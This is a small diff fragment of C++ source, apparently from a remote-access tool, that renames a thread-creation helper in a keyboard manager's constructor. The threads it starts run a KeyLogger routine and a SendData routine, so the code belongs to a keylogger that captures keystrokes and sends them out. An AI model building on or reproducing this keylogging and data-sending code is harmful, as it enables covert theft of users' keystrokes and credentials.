@@ -31,8 +31,8 @@ CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user
 
     m_bIsWorking = true;
 
-    m_hWorkThread = MyCreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
-    m_hSendThread = MyCreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
+    m_hWorkThread = __CreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
+    m_hSendThread = __CreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
     SetReady(TRUE);
 }
 
